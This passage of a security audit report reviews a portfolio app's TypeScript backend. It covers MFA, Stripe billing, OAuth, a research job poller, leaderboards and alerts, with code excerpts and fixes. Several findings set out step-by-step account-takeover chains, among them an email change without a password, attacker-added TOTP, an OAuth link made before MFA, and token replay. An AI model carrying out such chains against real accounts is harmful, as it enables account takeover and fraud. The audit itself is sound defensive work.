**The Problem:** The email update endpoint requires only an active access token — no password confirmation. Combined with the forgot-password flow, this creates a full account takeover chain:

1. Attacker obtains a valid session (session hijacking, CSRF, XSS response interception)
2. `POST /mfa/email` with attacker's email — changes victim's email, sets `emailVerified: false`
3. Attacker receives verification code on THEIR email
4. `POST /mfa/verify-email` — attacker verifies the new email
5. `POST /auth/forgot-password` with attacker's email — gets a password reset code
6. `POST /auth/reset-password` — attacker resets the victim's password
7. Full account takeover

```typescript
// mfa.controller.ts:208 — no password required, just auth token
export async function updateEmailHandler(req: AuthRequest, res: Response): Promise<void> {
  // ... only checks req.user exists
  await updateEmail(req.user.userId, parsed.data.email);  // email changed immediately
}

// Compare with totpDisableHandler:198 — this DOES require password
const valid = await verifyPassword(parsed.data.password, user.passwordHash);
```

**The Consequence:** Any attacker with a stolen 15-minute access token (or any form of session compromise) can take over the account permanently by changing the email, then resetting the password. The victim loses all access — their email is changed, password is reset, and they have no recovery path without contacting support.

**The Fix:** Require password confirmation before email change, consistent with `totpDisableHandler` and `emailOtpDisableHandler` which already require passwords. Add `password` to `updateEmailSchema` and verify it before calling `updateEmail()`.

### Finding 14.2 — MEDIUM: TOTP and Email OTP setup require no password/re-authentication

**Severity**: MEDIUM
**Location**: `mfa.controller.ts:146-155` (`totpSetupHandler`), `mfa.controller.ts:250-263` (`emailOtpSetupHandler`)

**The Problem:** Setting up MFA methods (TOTP or Email OTP) requires only an active access token. Disabling MFA methods requires password confirmation (lines 180-197, 288-305). This asymmetry means an attacker with a stolen session can:
1. Set up their own TOTP authenticator on the victim's account
2. The setup response returns the secret in plaintext (line 170): `secret: secret.base32`
3. The attacker completes verification with their own authenticator app
4. Now the victim's account has attacker-controlled MFA

Combined with Finding 14.1 (email change without password), an attacker can:
- Change the email (no password needed)
- Set up their own TOTP (no password needed)
- The victim can't recover: wrong email, unknown TOTP, can't disable MFA without password

```typescript
// totpSetupHandler — no password required
export async function totpSetupHandler(req: AuthRequest, res: Response) {
  const result = await beginTotpSetup(req.user.userId);
  res.json(result);  // includes secret in plaintext
}

// totpDisableHandler — password IS required (inconsistent)
const valid = await verifyPassword(parsed.data.password, user.passwordHash);
```

**The Consequence:** An attacker can add MFA factors to lock the victim out of their own account. The inconsistency between setup (no password) and teardown (password required) is a security design flaw.

**The Fix:** Require password verification for MFA setup operations, matching the existing pattern for disable operations. At minimum, require re-authentication (password or existing MFA factor) before `beginTotpSetup` and `beginEmailOtpSetup`.

### Finding 14.3 — LOW: `generateBackupCode` has modulo bias

**Severity**: LOW
**Location**: `mfa.service.ts:21-29`

**The Problem:** Backup code characters are selected via `bytes[i] % chars.length` where `chars` has 36 characters. Since `256 % 36 = 4`, the first 4 characters (a, b, c, d) have probability 8/256 while the remaining 32 have 7/256 — a ~14% relative bias.

```typescript
// Line 27 — modulo bias
code += chars[bytes[i] % chars.length]; // 256 % 36 = 4 → bias toward a-d
```

**The Consequence:** Marginally reduced entropy in backup codes. With 8 characters from an alphabet of 36, ideal entropy is ~41.4 bits. The modulo bias reduces this by a fraction of a bit. Given that codes are bcrypt-hashed and single-use, the practical impact is negligible.

**The Fix:** Use rejection sampling: discard random bytes >= 252 (largest multiple of 36 ≤ 256) and regenerate. Or use `crypto.randomInt(0, 36)` for each character.

---

---

## File 15: billing.service.ts + billing.controller.ts + billing.validators.ts + billing.routes.ts

**Audited**: 2026-03-01
**Role**: Stripe billing — checkout sessions, customer portal, webhook processing, plan management
**Lines**: ~373 (service) + ~92 (controller) + ~5 (validator) + ~22 (routes)

### Finding 15.1 — No priceId allowlist validation

**Severity:** MEDIUM
**Location:** `billing.validators.ts:3-5`, `billing.service.ts:84-91`

**The Problem:** The checkout validator only checks that `priceId` is a non-empty string:
```typescript
// billing.validators.ts — the complete validation
export const createCheckoutSchema = z.object({
  priceId: z.string().min(1, 'priceId is required'),
});
```
Any valid Stripe price ID from the account is accepted. Stripe's API will happily create a session for test prices, archived prices, or prices from different products. The `resolvePlanFromPriceId` function maps unrecognized prices to `'free'`, meaning a user could pay for a cheap test price and end up with `plan: 'free'` in the DB but with an active Stripe subscription — creating state confusion and potential upgrade-path exploits.

More critically, if someone creates a Stripe price via an unrelated tool or old integration on the same account, users could subscribe to those prices.

**The Consequence:** Checkout abuse via unauthorized price IDs. Billing state confusion between Stripe and the local DB.

**The Fix:** Validate `priceId` against the set of configured price IDs before creating the checkout session:
```typescript
const ALLOWED_PRICE_IDS = new Set([
  config.stripeProMonthlyPriceId, config.stripeProYearlyPriceId,
  config.stripePremiumMonthlyPriceId, config.stripePremiumYearlyPriceId,
  config.stripeEliteMonthlyPriceId, config.stripeEliteYearlyPriceId,
].filter(Boolean));

if (!ALLOWED_PRICE_IDS.has(priceId)) {
  throw new Error('Invalid price ID');
}
```

### Finding 15.2 — stripeCustomerId lacks unique constraint

**Severity:** MEDIUM
**Location:** `prisma/schema.prisma:62`, `billing.service.ts:128-131`

**The Problem:** `stripeCustomerId` on the User model is a bare nullable `String?` with no `@unique` constraint:
```prisma
stripeCustomerId       String?    // no @unique
```
The `updateUserPlanByCustomer` function uses `updateMany` to update plans by `stripeCustomerId`:
```typescript
await prisma.user.updateMany({
  where: { stripeCustomerId },
  data,  // plan, subscriptionId, planExpiresAt, etc.
});
```
If two users somehow share the same `stripeCustomerId` (race condition, migration error, manual DB edit), every webhook event for that customer updates both users' plans simultaneously.

**The Consequence:** Plan-change blast radius — one user's subscription lifecycle affects another user. A refund for user A could downgrade user B to free.

**The Fix:** Add `@unique` to `stripeCustomerId` in the Prisma schema. This also converts `updateMany` to a safe single-row update and prevents the race condition in customer creation from silently succeeding.

### Finding 15.3 — Race condition in Stripe customer creation

**Severity:** MEDIUM
**Location:** `billing.service.ts:63-82`

**The Problem:** `createCheckoutSession` has a classic TOCTOU race:
```typescript
let customerId = user.stripeCustomerId;          // 1. read
if (!customerId) {                                // 2. check
  const customer = await stripe.customers.create({ // 3. create (network round-trip)
    email: user.email ?? undefined,
    metadata: { userId: user.id },
  });
  customerId = customer.id;
  await prisma.user.update({                      // 4. write
    where: { id: user.id },
    data: { stripeCustomerId: customerId },
  });
}
```
Two concurrent checkout requests from the same user both see `null`, both create Stripe customers, and the second `update` overwrites the first. The first Stripe customer object is orphaned — subscriptions tied to it won't match the stored `stripeCustomerId`.

**The Consequence:** Orphaned Stripe customers. If a user subscribes via the orphaned customer, webhooks won't find the user because the stored customerId points to the newer customer.

**The Fix:** Add `@unique` on `stripeCustomerId` (Finding 15.2), then use an optimistic upsert pattern. Or use a DB-level advisory lock / `UPDATE ... WHERE stripeCustomerId IS NULL` to prevent double-creation.

### Finding 15.4 — Grace period enforcement is read-only (DB stale)

**Severity:** LOW
**Location:** `plan.middleware.ts:45-48`

**The Problem:** When `planExpiresAt` has passed, the `requirePlan` middleware treats the user as `free` in memory only:
```typescript
if (planExpiresAt && planExpiresAt < new Date()) {
  userPlan = 'free';       // memory only
  req.user.plan = 'free';  // memory only — no DB write
}
```
The database still shows the paid plan tier indefinitely. No background job or webhook handler corrects this. The `invoice.payment_failed` handler sets the grace period window but nothing fires when it expires.

**The Consequence:** The `user.plan` column in the database is permanently stale after grace period expiry. Any admin dashboard, reporting, analytics query, or code path that reads `plan` from the DB without also checking `planExpiresAt` sees paid users who haven't paid. The `getBillingStatus` endpoint correctly shows Stripe status, but direct DB queries are misleading.

**The Fix:** Either write back `plan: 'free'` on first expired-plan middleware hit, or add a scheduled cleanup job that downgrades expired plans. At minimum, add a comment documenting this intentional behavior.

### Finding 15.5 — Webhook controller bypasses getStripeClient() safety check

**Severity:** LOW
**Location:** `billing.controller.ts:83`

**The Problem:** The webhook handler creates a raw Stripe instance instead of using the guarded factory:
```typescript
// Controller line 83 — raw constructor, no key check
const stripe = new Stripe(config.stripeSecretKey);

// Compare: getStripeClient() in the service checks for undefined
function getStripeClient(): Stripe {
  if (!config.stripeSecretKey) {
    throw new Error('Stripe is not configured');  // clear error
  }
  return new Stripe(config.stripeSecretKey);
}
```
If `stripeSecretKey` is undefined, the raw constructor receives `undefined`, and the Stripe SDK behavior is version-dependent (may throw, may silently fail signature verification).

**The Consequence:** In misconfigured environments, webhook processing fails with an unclear error instead of the explicit "Stripe is not configured" message.

**The Fix:** Replace `new Stripe(config.stripeSecretKey)` with `getStripeClient()` from the service, or import and use the same guard pattern.

---

---

## File 16: oauth.service.ts + oauth.controller.ts + oauth.validators.ts + oauth.routes.ts

**Audited**: 2026-03-01
**Role**: Google & Apple OAuth — token verification, account linking, user creation, MFA integration
**Lines**: ~300 (service) + ~193 (controller) + ~16 (validator) + ~14 (routes)

### Finding 16.1 — OAuth email-based account linking happens before MFA, creating a permanent backdoor

**Severity:** HIGH
**Location:** `oauth.service.ts:148-170`, `oauth.controller.ts:93-108`

**The Problem:** When a user logs in via Google/Apple and no provider ID match exists, `findOrCreateOAuthUser` checks for an email match and permanently links the OAuth provider to the existing account — BEFORE MFA is checked in the controller:

```typescript
// oauth.service.ts:148-170 — link happens FIRST
if (profile.email && profile.emailVerified) {
  const existingByEmail = await prisma.user.findUnique({ where: { email: normalizedEmail } });
  if (existingByEmail && existingByEmail.emailVerified) {
    await prisma.user.update({
      where: { id: existingByEmail.id },
      data: {
        [providerIdField]: profile.providerId,  // ← PERMANENT LINK
        emailVerified: true,
      },
    });
    return { user: existingByEmail, isNewUser: false };
  }
}

// oauth.controller.ts:93-108 — MFA check happens AFTER the link
if (!isNewUser) {
  const mfaEnabled = await hasMfaEnabled(user.id);
  if (mfaEnabled) {
    // Returns mfaRequired: true — no session issued
    // But the googleId/appleId is ALREADY linked in the DB
    return;
  }
}
```

Attack chain:
1. Victim has email/password account with MFA enabled
2. Attacker compromises victim's Google account (phishing, credential stuffing)
3. Attacker calls `POST /auth/oauth/google/callback` with compromised Google credentials
4. `findOrCreateOAuthUser` links `googleId` to victim's account permanently
5. Controller returns `mfaRequired: true` — attacker is blocked
6. But `googleId` is now permanently stored on victim's user record
7. If victim ever disables MFA (or attacker waits for TOTP key rotation), attacker has persistent access via Google OAuth

**The Consequence:** MFA is supposed to protect against compromised email/credentials. The pre-MFA link defeats this guarantee entirely, creating a persistent backdoor that survives the immediate MFA block. The attacker doesn't get a session today, but the database state is permanently corrupted in their favor.

**The Fix:** Split the flow into two phases:
1. `findOrCreateOAuthUser` should return a "pending link" result instead of writing to DB
2. Only persist the provider link AFTER MFA is successfully completed (or if MFA is not enabled)
```typescript
// In the controller, after MFA passes:
if (pendingLink) {
  await prisma.user.update({
    where: { id: user.id },
    data: { [providerIdField]: profile.providerId },
  });
}
```

### Finding 16.2 — Apple nonce is optional, enabling ID token replay

**Severity:** MEDIUM
**Location:** `oauth.validators.ts:10`, `oauth.service.ts:72-86`

**The Problem:** The Apple callback validator makes `nonce` optional:
```typescript
// oauth.validators.ts:10
nonce: z.string().max(128).optional(),
```
When no nonce is provided, `verifyAppleToken` passes no nonce to the verification library:
```typescript
// oauth.service.ts:76
...(nonce ? { nonce } : {}),
```
Without nonce binding, an intercepted Apple ID token can be replayed by anyone who captures it (MITM on a compromised network, XSS stealing the token from the frontend). Apple ID tokens have a ~10-minute expiration, but within that window the token grants full account access.

**The Consequence:** Replay attacks within the Apple ID token's expiration window. An attacker who captures the token (via network interception, XSS, or log leakage) can create a session by replaying it to the callback endpoint.

**The Fix:** Make nonce required in the validator and verify it against a server-generated value:
```typescript
nonce: z.string().min(1).max(128),
```
The frontend should generate a random nonce per auth attempt, hash it, pass the hash to Apple, and send the original to the backend for verification.

### Finding 16.3 — Username final fallback skips uniqueness check

**Severity:** LOW
**Location:** `oauth.service.ts:112-113`

**The Problem:** The third username attempt in `generateUsername` doesn't verify uniqueness:
```typescript
// First attempt: exact match check
const exists = await prisma.user.findUnique({ where: { username: candidate } });
if (exists) {
  // Second attempt: suffix added, checked
  candidate = `${base.slice(0, 14)}_${Date.now().toString(36).slice(-5)}`;
  const retry = await prisma.user.findUnique({ where: { username: candidate } });
  if (retry) {
    // Third attempt: NOT checked
    candidate = `user_${Date.now().toString(36)}`;  // ← no findUnique
  }
}
```
If the third candidate collides with an existing username, the subsequent `prisma.user.create` throws a P2002 error. The P2002 recovery in `findOrCreateOAuthUser` handles this gracefully, so it's not a crash, but the user sees a confusing "OAuth account conflict" error instead of getting a generated username.

**The Consequence:** Extremely unlikely but possible: a new OAuth user gets a confusing error message instead of a successful account creation. The retry recovery path works but may return the wrong user if the P2002 is on the username field rather than the provider field.

**The Fix:** Add a uniqueness check on the third attempt, or use a loop with a max iteration count:
```typescript
for (let i = 0; i < 5; i++) {
  candidate = `user_${Date.now().toString(36)}_${i}`;
  if (!(await prisma.user.findUnique({ where: { username: candidate }, select: { id: true } }))) break;
}
```

---

---

## File 17: deep-research.service.ts + deep-research.controller.ts + deep-research.validators.ts + deep-research.routes.ts

**Audited**: 2026-03-01
**Role**: NALA AI Deep Research — Gemini Interactions API, SSE streaming, background polling, job lifecycle
**Lines**: ~1191 (service) + ~174 (controller) + ~25 (validator) + ~35 (routes)

### Finding 17.1 — Lease acquisition doesn't verify success — double-polling possible

**Severity:** MEDIUM
**Location:** `deep-research.service.ts:1057-1072`

**The Problem:** The poller uses `updateMany` to acquire a lease, but never checks the return value (`count`) to confirm the lease was actually acquired:
```typescript
// Acquire lease — atomic update with condition check
try {
  await prisma.deepResearchJob.updateMany({
    where: {
      id: job.id,
      OR: [
        { leaseUntil: null },
        { leaseUntil: { lt: now } },
      ],
    },
    data: {
      polledBy: INSTANCE_ID,
      leaseUntil: leaseExpiry,
    },
  });
  // ← No check of returned { count: N } — proceeds regardless
} catch {
  continue; // Only catches exceptions, not count === 0
}

// Continues to poll Gemini API regardless of whether lease was acquired
```
If two instances run the poller at nearly the same time: instance A's `updateMany` succeeds (count=1), instance B's `updateMany` succeeds (count=0, no rows matched). But instance B still proceeds to the polling logic because count=0 isn't an exception.

**The Consequence:** Multiple instances can poll the same Gemini interaction simultaneously. This wastes API quota, could cause rate limiting from Google, and in edge cases could produce duplicate completion writes (though the last-write-wins on `status: 'completed'` is idempotent).

**The Fix:** Check the return value and skip if no rows were updated:
```typescript
const result = await prisma.deepResearchJob.updateMany({ ... });
if (result.count === 0) continue; // Another instance acquired the lease
```

### Finding 17.2 — Cancel doesn't cancel Gemini interaction + bypasses monthly limit

**Severity:** MEDIUM
**Location:** `deep-research.service.ts:951-976`, `deep-research.service.ts:662-671`

**The Problem:** Two compounding issues:

1. `cancelJob` only updates the DB status — it never calls Gemini's cancel API:
```typescript
export async function cancelJob(jobId: string, userId: string) {
  // ... find job, check status ...
  const updated = await prisma.deepResearchJob.update({
    where: { id: job.id },
    data: { status: 'cancelled', completedAt: new Date() },
    // ← No Gemini API call to cancel the interaction
  });
  return updated;
}
```
The Gemini interaction keeps running in the background, consuming API credits ($2-5 per run).

2. Cancelled jobs are excluded from the monthly limit count:
```typescript
const monthlyUsed = await prisma.deepResearchJob.count({
  where: {
    userId,
    createdAt: { gte: monthStart },
    status: { notIn: ['cancelled'] },  // ← cancelled don't count
  },
});
```

**The Consequence:** A user can: start research → immediately cancel → start another → repeat. Each cycle creates a Gemini interaction that costs $2-5 in API credits but doesn't count toward the monthly limit. With a default limit of 10, a user could trigger 50+ Gemini interactions per month by cycling start-cancel.

**The Fix:**
1. Call Gemini's cancel API when cancelling a job (if the API supports it), or at minimum count cancelled jobs toward the monthly limit
2. Change the monthly limit query to include cancelled jobs:
```typescript
status: { notIn: [] }, // or remove the status filter entirely
```
Or add a separate `billable` flag that's set on creation and never cleared by cancel.

### Finding 17.3 — Raw Gemini API error details logged to console

**Severity:** LOW
**Location:** `deep-research.controller.ts:54-56`

**The Problem:** When a Gemini API call fails, the full Axios error response is logged:
```typescript
if (axios.isAxiosError(err) && err.response) {
  console.error('[Deep Research] Gemini API response:', err.response.status, JSON.stringify(err.response.data));
}
```
While this doesn't leak to the HTTP response (which returns a generic error), Gemini's error responses could contain:
- API key hints or account identifiers
- Internal Google error details useful for enumeration
- Request content echoed back (containing user portfolio data)

**The Consequence:** Sensitive data in server logs. If logs are aggregated to a third-party service (Sentry, Datadog, etc.), portfolio data and API metadata could be exposed to log infrastructure operators.

**The Fix:** Sanitize logged error data — only log `err.response.status` and a truncated/sanitized `err.response.data.error?.message`, not the full response payload.

---

---

## File 18: plaid-sync.service.ts

**Audited**: 2026-03-01
**Role**: Plaid brokerage holdings sync — fetches holdings via Plaid API, aggregates, upserts into Holding table
**Lines**: ~216

### Finding 18.1 — Upsert loop not wrapped in transaction — partial sync on failure

**Severity:** LOW
**Location:** `plaid-sync.service.ts:157-206`

**The Problem:** The upsert loop iterates over aggregated holdings and performs individual `findFirst` → `create`/`update` calls without a `prisma.$transaction` wrapper:
```typescript
for (const [ticker, aggregate] of aggregated) {
  const existing = await prisma.holding.findFirst({ where: { userId, ticker } });
  if (!existing) {
    await prisma.holding.create({ data: { userId, ticker, ... } });
    // If the process crashes here, some holdings are synced and others aren't
  } else if (existing.source === 'plaid') {
    await prisma.holding.update({ ... });
  }
}
```
If the process crashes, a network timeout occurs, or the DB connection drops mid-loop, the portfolio is left in a partial state — some holdings reflect Plaid's latest data while others show stale values.

The `@@unique([userId, ticker])` constraint prevents duplicates on retry, but the next sync may be hours or days later (or manual-only), leaving the partial state visible to the user.

**The Consequence:** Inconsistent portfolio data after a partial sync failure. The user sees a mix of current and stale holdings, which could lead to incorrect portfolio valuations and bad investment decisions.

**The Fix:** Wrap the upsert loop in a `prisma.$transaction`:
```typescript
await prisma.$transaction(async (tx) => {
  for (const [ticker, aggregate] of aggregated) {
    const existing = await tx.holding.findFirst({ ... });
    // ... create/update using tx instead of prisma
  }
});
```

### Finding 18.2 — Zero-quantity holdings accepted from Plaid

**Severity:** LOW
**Location:** `plaid-sync.service.ts:101-106`, `plaid-sync.service.ts:138-143`

**The Problem:** The quantity validation rejects `null`, `NaN`, and negative values, but accepts `quantity === 0`:
```typescript
if (quantity == null || !Number.isFinite(quantity) || quantity < 0) {
  skipped += 1;
  // ...
  continue;
}
// quantity === 0 passes through → creates/updates a holding with 0 shares
```
Plaid can report closed positions with 0 quantity. These get synced as holdings with `shares: 0`, cluttering the portfolio. The `averageCost` calculation divides by quantity, so `aggregate.quantity > 0 ? ... : 0` handles the division-by-zero case, but the zero-share holding still persists in the portfolio.

**The Consequence:** Portfolio displays ghost positions with 0 shares. These show up in charts, portfolio value calculations, and API responses. While not a security vulnerability, zero-share holdings waste resources (price lookups, snapshot storage) and confuse users.

**The Fix:** Skip zero-quantity holdings:
```typescript
if (quantity == null || !Number.isFinite(quantity) || quantity <= 0) {
```

---

**Positives:** This is a well-written sync service. `getDecryptedAccessToken` properly filters by `userId` (preventing cross-user access token theft). Source protection prevents Plaid from overwriting manual/CSV holdings. Input validation checks `Number.isFinite()` for both quantity and cost basis. Security type filtering skips crypto and internal IDs. Options parsing via OCC symbol parser handles derivatives correctly with expiry checks.

---

---

## File 19: leaderboard.service.ts + leaderboard.controller.ts + leaderboard.routes.ts

**Audited**: 2026-03-01
**Role**: Public leaderboard — computes portfolio returns for all eligible users, anti-cheat detection, caches results
**Lines**: ~352 (service) + ~30 (controller) + ~9 (routes)

### Finding 19.1 — User.findMany fetches ALL columns including passwordHash and Stripe IDs

**Severity:** MEDIUM
**Location:** `leaderboard.service.ts:87-93`

**The Problem:** The initial user query fetches every column — no `select` clause:
```typescript
const users = await prisma.user.findMany({
  where: {
    leaderboardEligible: true,
    holdings: { some: { shares: { gt: 0 } } },
    ...(regionFilter ? { region: regionFilter, showRegion: true } : {}),
  },
  // ← No select: fetches passwordHash, email, stripeCustomerId,
  //   stripeSubscriptionId, googleId, appleId, etc.
});
```
Every eligible user's full record — including `passwordHash`, `email`, `stripeCustomerId`, `stripeSubscriptionId`, `googleId`, `appleId` — is loaded into memory. While these fields aren't returned in the API response (the entries are constructed with specific fields at lines 291-311), the full objects live in the Node.js heap during computation.

**The Consequence:** Memory-resident PII for all eligible users during every leaderboard computation. If any error-handling path logs the `users` array, or if a debugger/memory dump captures the heap, all sensitive fields are exposed. With hundreds or thousands of users, this is a significant privacy surface.

**The Fix:** Add an explicit `select` clause with only the fields needed:
```typescript
const users = await prisma.user.findMany({
  where: { ... },
  select: {
    id: true, username: true, displayName: true,
    region: true, trackingStartAt: true,
  },
});
```

### Finding 19.2 — Public endpoint with no auth, no rate limit, triggers expensive computation

**Severity:** MEDIUM
**Location:** `leaderboard.routes.ts:6`, `leaderboard.service.ts:85-351`

**The Problem:** The leaderboard endpoint is completely unprotected:
```typescript
// leaderboard.routes.ts — no middleware at all
router.get('/', getLeaderboardHandler);
```
- **No authentication** — anyone on the internet can query it
- **No rate limiter** — and the global `apiLimiter` skips all GET requests (Finding 12.1)
- **No pagination** — returns ALL eligible users
- **No result caching** — the full computation runs fresh every request (only candle data is cached)

Each request triggers:
1. `findMany` for ALL eligible users (no limit)
2. `findMany` for ALL holdings across all users
3. `findMany` for ALL user settings
4. `fetchPrices()` for all unique tickers (external API call)
5. `getDailyCandles()` for all unique tickers (Polygon API calls, cached 6h)
6. N per-user `snapshotCount` queries (N+1 pattern, line 155-157)
7. N per-user `upsert` to LeaderboardCache (line 315-335)

**The Consequence:** A single unauthenticated GET request can trigger hundreds of DB queries and external API calls. An attacker can exhaust database connections, Polygon API rate limits, and server memory by sending repeated requests. With 1000 eligible users × 50 tickers, each request generates ~1050 DB queries and ~50 external API calls.

**The Fix:**
1. Add `heavyReadLimiter` (or a dedicated leaderboard limiter) to the route
2. Cache the computed result for 1-5 minutes (the leaderboard doesn't need to be real-time)
3. Add pagination or a fixed limit on returned entries
4. Batch the N snapshotCount queries into a single `groupBy`

### Finding 19.3 — currentAssets exposes exact portfolio value publicly

**Severity:** MEDIUM
**Location:** `leaderboard.service.ts:310`, `leaderboard.controller.ts:24`

**The Problem:** Each leaderboard entry includes the user's exact portfolio value:
```typescript
entries.push({
  userId: user.id,           // ← UUID exposed
  username: user.username,
  currentAssets: liveValue,  // ← exact dollar amount (e.g., $147,832.41)
  // ...
});
```
This is returned from a public, unauthenticated endpoint. Anyone can see exactly how much money each user has invested — their live portfolio value including cash balance minus margin debt.

**The Consequence:** Financial privacy violation. Users' exact net worth (in this app) is publicly queryable. Combined with the exposed `userId`, an attacker can target wealthy users for social engineering or phishing. Users who opted into `leaderboardEligible` likely expected to share return percentages, not dollar amounts.

**The Fix:** Remove `currentAssets` from the public response, or replace it with a bucketed range (e.g., "$100K-$500K"). If exact values are needed for the frontend, gate them behind authentication and only show to the user themselves:
```typescript
currentAssets: requestingUserId === user.id ? liveValue : null,
```

### Finding 19.4 — Anti-cheat flags visible to flagged users

**Severity:** LOW
**Location:** `leaderboard.service.ts:303-305`

**The Problem:** Anti-cheat detection results are included in the public response:
```typescript
entries.push({
  flagged,                    // true/false — visible to everyone
  flagReason,                 // "Suspicious single-day return detected (>300%)"
  // ...                      // or "Abnormally high risk-adjusted return (Sharpe > 5)"
});
```
Flagged users (or anyone) can see the exact detection logic — what thresholds trigger flags and what metrics are monitored.

**The Consequence:** Cheaters can reverse-engineer the anti-cheat system. They know to keep daily returns under 300% and Sharpe ratio under 5. They can also see immediately when they've been flagged and adjust their strategy before manual review.

**The Fix:** Only expose `flagged`/`flagReason` to admin users. For regular users and public access, either hide flagged entries entirely or show a generic "Under review" status without revealing the detection criteria.

---

---

## File 20: notifications.service.ts + alert.service.ts + priceAlert.service.ts + priceAlert.controller.ts + notifications.controller.ts

**Audited**: 2026-03-01
**Role**: Notification pipeline — earnings alerts, portfolio drawdown alerts, price alerts (create/evaluate/trigger)
**Lines**: ~139 (notifications) + ~161 (alert) + ~261 (priceAlert) + ~159 (priceAlert controller) + ~20 (notifications controller)

### Finding 20.1 — No input validation on createPriceAlert — arbitrary values stored

**Severity:** MEDIUM
**Location:** `priceAlert.controller.ts:47-71`

**The Problem:** The `createPriceAlertHandler` manually destructures `req.body` with no Zod schema validation:
```typescript
const { ticker, condition, targetPrice, percentChange,
        referencePrice, referencePriceType, repeatAlert, expiresAt } = req.body;

if (!ticker || !condition) { /* only checks presence, not type/format */ }
```
- **`ticker`**: No length limit, no format validation — could be hundreds of characters or contain arbitrary Unicode
- **`targetPrice`/`percentChange`/`referencePrice`**: No type check — strings like `"NaN"` or objects could be passed (Prisma may reject non-numeric values for Float fields, but the error is unhandled and returns a confusing 400)
- **`referencePriceType`**: No enum validation — any string accepted, stored directly (should be `'current' | 'open' | 'avgCost'`)
- **`expiresAt`**: Passed to `new Date()` without format validation — `new Date("not-a-date")` creates `Invalid Date`

Compare with deep-research endpoints which use proper Zod schemas for all inputs.

**The Consequence:** Malformed data in the DB. Invalid `referencePriceType` values cause undefined behavior in the evaluator. Excessively long tickers waste quote-lookup API calls during `evaluatePriceAlerts` (every 60 seconds). Non-numeric price values cause unhandled Prisma errors.

**The Fix:** Add a Zod schema:
```typescript
const createPriceAlertSchema = z.object({
  ticker: z.string().trim().min(1).max(10).toUpperCase(),
  condition: z.enum(['above', 'below', 'pct_up', 'pct_down']),
  targetPrice: z.number().positive().optional(),
  percentChange: z.number().positive().max(1000).optional(),
  referencePrice: z.number().positive().optional(),
  referencePriceType: z.enum(['current', 'open', 'avgCost']).optional(),
  repeatAlert: z.boolean().optional(),
  expiresAt: z.string().datetime().optional(),
});
```

### Finding 20.2 — Unbounded limit on event queries

**Severity:** LOW
**Location:** `priceAlert.controller.ts:128`

**The Problem:** The events endpoint parses `limit` from the query string with no maximum:
```typescript
const limit = req.query.limit ? parseInt(req.query.limit as string, 10) : 50;
const events = await getPriceAlertEvents(req.user!.userId, limit);
```
A client can send `?limit=999999` to retrieve all events at once. The same pattern exists in `alert.service.ts:47` (`getAlertEvents` defaults to 50 but accepts any value from the controller).

**The Consequence:** Memory pressure from unbounded query results. While events are filtered by userId (limiting practical impact), a user with thousands of historical events could trigger a large response.

**The Fix:** Clamp the limit: `Math.min(parseInt(..., 10) || 50, 100)`.

### Finding 20.3 — sendEarningsAlerts loads ALL holdings for ALL users

**Severity:** LOW
**Location:** `notifications.service.ts:78-80`

**The Problem:** The earnings alert scheduler loads every holding across all users:
```typescript
const holdings = await prisma.holding.findMany({
  select: { userId: true, ticker: true },
  // ← No where clause, no limit — all holdings in the database
});
```
Then iterates every user × every ticker, calling `getEarningsData(ticker)` per ticker:
```typescript
for (const [userId, tickers] of byUser.entries()) {
  for (const ticker of uniqueTickers) {
    const earnings = await getEarningsData(ticker);  // external API call per ticker
  }
}
```

**The Consequence:** At scale (1000 users × 20 holdings each = 20K holdings), this function loads all 20K records into memory and makes up to 20K external API calls sequentially. This is an O(users × tickers) scheduler that could run for minutes and exhaust external API rate limits.

**The Fix:** Deduplicate tickers across all users first, fetch earnings data once per unique ticker, then fan out notifications. The current code deduplicates per-user but not across users — if 500 users all hold AAPL, `getEarningsData('AAPL')` is called 500 times.

---

**Positives:** All user-facing alert operations properly filter by userId. Ownership verification via `findFirst({ where: { id, userId } })` on updates and deletes. Drawdown alerts use 24-hour cooldown to prevent notification spam. Price alert trigger uses `prisma.$transaction` for atomic update + event creation. Push notifications are fire-and-forget (don't block alert evaluation). Plan limit enforcement on free tier (1 alert max). P2002 dedup in notification audit log prevents duplicate entries.

---

---

## File 21: milestone.service.ts + anomaly-detection.service.ts

**Audited**: 2026-03-01
**Role**: Event detection — 52-week/all-time milestone alerts, price/volume anomalies, sector divergence, dividend changes
**Lines**: ~291 (milestone) + ~424 (anomaly-detection)

### Finding 21.1 — In-memory cooldown map grows unboundedly — memory leak

**Severity:** MEDIUM
**Location:** `milestone.service.ts:11`

**The Problem:** The milestone cooldown uses a plain `Map` with no size limit or TTL eviction:
```typescript
const recentNotifications = new Map<string, number>();
// Key format: `${ticker}-${userId}-${type}` → timestamp
```
Every milestone check adds entries but never removes them. With 500 users × 50 tickers × 4 milestone types, that's 100K entries after a single full cycle. Over days of continuous operation, the map grows to millions of entries (each ~100 bytes for the key string + 8 bytes for timestamp = ~10MB+ for 100K entries, scaling linearly).

Compare with `anomaly-detection.service.ts` which uses DB-based cooldowns (`checkCooldown` function) — those survive restarts and don't leak memory.

**The Consequence:** Unbounded heap growth over time. On a long-running server without restarts, this will eventually contribute to OOM crashes or GC pressure. The entries are never useful after their cooldown expires (4-24 hours), but they persist forever.

**The Fix:** Replace with a `NodeCache` (already used elsewhere in the codebase) with TTL matching the longest cooldown:
```typescript
const recentNotifications = new NodeCache({ stdTTL: 24 * 60 * 60 }); // 24h auto-eviction
```

### Finding 21.2 — Division by zero in dividend change percentage

**Severity:** LOW
**Location:** `anomaly-detection.service.ts:380`

**The Problem:** Dividend change percentage is calculated without guarding against zero:
```typescript
const changePct = (changeAmount / compareEvent.amountPerShare) * 100;
//                                  ↑ could be 0 for special dividends or data errors
```
If `compareEvent.amountPerShare` is 0 (special dividend, data import error, or stock split adjustment), this produces `Infinity` or `NaN`. The value flows into:
- The severity calculation at line 389 (`Math.abs(changePct) >= 20`)
- The event description at line 392
- The DB write at line 404 (`value: changePct`)
- The push notification body at line 412

**The Consequence:** `Infinity` or `NaN` stored in the database, displayed in push notifications ("dividend cut Infinity%"), and used in severity classification. `Math.abs(NaN) >= 20` is `false`, so NaN events silently get severity `'info'` and never trigger push.

**The Fix:** Guard against zero denominator:
```typescript
const changePct = compareEvent.amountPerShare > 0
  ? (changeAmount / compareEvent.amountPerShare) * 100
  : 0;
```

### Finding 21.3 — Milestone checker O(tickers × users × types) DB queries

**Severity:** LOW
**Location:** `milestone.service.ts:165-198`

**The Problem:** For each ticker × user × milestone type combination, the checker runs up to 3 `findFirst` queries (cooldown check + ATH/ATL suppression checks):
```typescript
for (const { type, threshold, check } of milestones) {   // 4 types
  for (const userId of userIds) {                          // N users per ticker
